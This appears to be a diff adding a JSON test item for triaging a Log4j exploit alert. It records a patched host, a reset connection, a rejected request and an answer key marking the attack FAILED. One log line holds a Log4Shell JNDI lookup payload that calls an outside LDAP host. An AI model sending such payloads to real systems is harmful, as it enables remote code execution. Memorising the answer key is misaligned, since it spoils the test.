@@ -1,0 +1,78 @@
+{
+  "id": "A-1014",
+  "alert": {
+    "src": "203.0.113.228",
+    "dst": "10.2.2.184",
+    "dst_port": 8080,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Apache Log4j RCE Attempt",
+    "claimed_cve": "CVE-2021-44228",
+    "severity": "critical",
+    "ts": "2026-09-14T05:17:00Z",
+    "flow_id": "f9797"
+  },
+  "world": {
+    "assets": {
+      "10.2.2.184": {
+        "host": "host-10-2-2-184",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "8080": {
+            "product": "apache-log4j",
+            "version": "2.17.1"
+          }
+        },
+        "peers": [
+          "10.2.5.121"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2021-44228": {
+        "product": "apache-log4j",
+        "patched_in": "2.17.0",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f9797": {
+        "direction": "inbound",
+        "bytes_out": 128,
+        "bytes_in": 340,
+        "duration_s": 1,
+        "state": "RST",
+        "note": "connection reset, no data exfil"
+      }
+    },
+    "logs": {
+      "host-10-2-2-184": [
+        "[host-10-2-2-184] 8080 POST /api/x 403 jndi:ldap://203.0.113.228/a  <- payload rejected",
+        "[host-10-2-2-184] no new child processes"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-2-184": {
+        "suspicious": false,
+        "tree": "java (steady state, no children)",
+        "persistence": null
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.228",
+        "dst": "10.2.2.184",
+        "port": 8080,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "FAILED",
+    "action": "monitor"
+  },
+  "adversarial": true,
+  "solve_rationale": "target patched above patched_in; payload rejected; RST, no exfil"
+}
